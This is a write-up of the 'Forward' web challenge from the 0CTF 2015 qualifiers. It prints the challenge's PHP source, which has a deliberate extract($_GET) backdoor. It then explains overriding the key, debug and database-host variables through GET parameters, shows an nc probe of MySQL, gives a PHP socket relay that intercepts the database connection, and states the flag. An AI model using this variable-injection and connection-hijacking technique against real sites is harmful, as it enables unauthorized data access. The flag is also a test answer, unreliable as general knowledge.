# 0CTF 2015 Quals CTF: Forward

**Category:** Web
**Points:** 250
**Solves:** 42
**Description:** 

> Just do it!
>
> <http://202.112.28.121/>
>
> <http://202.112.26.104/>

___

## Write-up

This task is a web task worth 250 points from the 0CTF 2015.
There is an input field, and two buttons : Login and FLAG.<br>
FLAG gives us the source code of the task, without the db credentials :

```php
<?php
    if (isset($_GET['view-source'])) {
        show_source(__FILE__);
        exit();
    }
    include("./inc.php"); // key & database config
 
    function err($str){ die("<script>alert(\"$str\");window.location.href='./';</script>"); }
 
    $nonce = mt_rand();
 
    extract($_GET); // this is my backdoor
     
    if (empty($_POST['key'])) {
 
        err("Parameter Missing!");
    }
 
    if ($_POST['key'] !== $key) {
        err("You Are Not Authorized!");
    }
 
    $conn = mysql_connect($host, $user, $pass);
 
    if (!$conn) {
        err("Database Error, Please Contact with GameMaster!");
    }
 
    $query = isset($_POST['query']) ? bin2hex($_POST['query']) : "SELECT flag FROM forward.flag";
    $res = mysql_query($query);
    if (FALSE == $res) {
        err("Database Error, Please Contact with GameMaster!");
    }
 
    $row = mysql_fetch_array($res);
 
    if ($debug) {
        echo "HOST:\t{$host}<br/>";
        echo "USER:\t{$user}<br/>";
    }
 
    echo "<del>FLAG:\t0ctf{</del>" . sha1($nonce . md5($row['flag'])) . "<del>}</del><br/>"; // not real flag
 
    mysql_close($conn);
?>
```
<br><br>
At this point, I was a bit sad, because I wanted to get the flag. :(<br>
After reading the source code, we can guess that we need to get our hands on $row['flag'].

There is also a HUGE hint : `this is my backdoor`.<br>
`extract` extracts variable from an array to the current scope.<br>
Exemple : extract(['foo' => 'bar']); is the same as $foo = 'bar';

We can use it to bypass the first check :
if `$_GET['key']` is set, `$key` will be set to it. (hence the backdoor)

Our first thought is that we can also use it to set nonce to '', so that the page outputs `sha1(md5($flag));`.<br>
This is pointless : we need to reverse a SHA1, then a MD5, and it would take forever.

We can set `$_GET['debug']` to 1, to gather informations about db host, and user :
```
HOST: 202.112.28.121
USER: forward
```
<br><br>
With `nc -vv 202.112.28.121 3306`, we can see the version of MySQL, and that it DOES accept connection from outside.<br>
We have no way to retrieve the password from the script. But we know that the script retrieves the flag.

Interesting thing :
`extract` is called after $host, $user and $pass definitions. It means we can also alter them.

I then made a script to set up a man-in-the-middle attack:<br>
- The web page (client) connects to my computer.<br>
- My computer connects to the MySQL server (server).<br>
- As soon as I read something on one of the sockets, I forward it to the other peer.

Here is the code :
```php
<?php
    $socket = socket_create(2, 1, 0);
    socket_bind($socket, 0, 3306);
    socket_listen($socket);
 
    $client = socket_accept($socket);
 
    $server = socket_create(2, 1, 0);
    socket_connect($server, '202.112.28.121', 3306);
 
    socket_set_nonblock($client);
    socket_set_nonblock($server);
 
    while(true) {
        $packet = socket_read($server, 4096);
        if($packet) {
            printf("S->C: %s\n", $packet);
            socket_write($client, $packet);
        }
 
        $packet = socket_read($client, 4096);
        if($packet) {
            printf("S<-C: %s\n", $packet);
            socket_write($server, $packet);
        }
        usleep(1e4);
    }
?>
```
<br><br>
This way, I managed to get the flag :

`Payload: /admin.php?key=a&debug=1&host=[ip], POST: key=a`
<br><br>
__Flag__: 0ctf{w3ll_d0ne_guY}
<br><br>
Enjoy !
- [XeR]()
